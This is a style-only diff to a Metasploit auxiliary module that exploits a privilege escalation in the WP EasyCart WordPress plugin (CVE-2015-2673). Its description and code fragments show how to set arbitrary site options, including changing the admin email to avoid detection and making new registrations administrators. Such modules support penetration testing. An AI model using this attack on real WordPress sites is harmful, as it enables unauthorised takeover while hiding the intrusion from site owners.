@@ -7,38 +7,39 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HTTP::Wordpress
 
   def initialize(info = {})
-    super(update_info(
-      info,
-      'Name'            => 'WordPress WP EasyCart Plugin Privilege Escalation',
-      'Description'     => %q{
-        The WordPress WP EasyCart plugin from version 1.1.30 to 3.0.20 allows authenticated
-        users of any user level to set any system option via a lack of validation in the
-        ec_ajax_update_option and ec_ajax_clear_all_taxrates functions located in
-        /inc/admin/admin_ajax_functions.php. The module first changes the admin e-mail address
-        to prevent any notifications being sent to the actual administrator during the attack,
-        re-enables user registration in case it has been disabled and sets the default role to
-        be administrator. This will allow for the user to create a new account with admin
-        privileges via the default registration page found at /wp-login.php?action=register.
-      },
-      'Author'          =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'WordPress WP EasyCart Plugin Privilege Escalation',
+        'Description' => %q{
+          The WordPress WP EasyCart plugin from version 1.1.30 to 3.0.20 allows authenticated
+          users of any user level to set any system option via a lack of validation in the
+          ec_ajax_update_option and ec_ajax_clear_all_taxrates functions located in
+          /inc/admin/admin_ajax_functions.php. The module first changes the admin e-mail address
+          to prevent any notifications being sent to the actual administrator during the attack,
+          re-enables user registration in case it has been disabled and sets the default role to
+          be administrator. This will allow for the user to create a new account with admin
+          privileges via the default registration page found at /wp-login.php?action=register.
+        },
+        'Author' => [
           'rastating' # Discovery and Metasploit module
         ],
-      'License'         => MSF_LICENSE,
-      'References'      =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           ['CVE', '2015-2673'],
           ['WPVDB', '7808'],
           ['URL', 'https://rastating.github.io/wp-easycart-privilege-escalation-information-disclosure/']
         ],
-      'DisclosureDate'  => '2015-02-25'
-      ))
+        'DisclosureDate' => '2015-02-25'
+      )
+    )
 
     register_options(
       [
         OptString.new('USERNAME', [true, 'The WordPress username to authenticate with']),
         OptString.new('PASSWORD', [true, 'The WordPress password to authenticate with'])
-      ])
+      ]
+    )
   end
 
   def check
@@ -55,11 +56,11 @@ class MetasploitModule < Msf::Auxiliary
 
   def set_wp_option(name, value, cookie)
     res = send_request_cgi(
-      'method'    => 'POST',
-      'uri'       => wordpress_url_admin_ajax,
-      'vars_get'  => { 'action' => 'ec_ajax_update_option' },
+      'method' => 'POST',
+      'uri' => wordpress_url_admin_ajax,
+      'vars_get' => { 'action' => 'ec_ajax_update_option' },
       'vars_post' => { 'option_name' => name, 'option_value' => value },
-      'cookie'    => cookie
+      'cookie' => cookie
     )
 
     if res.nil?
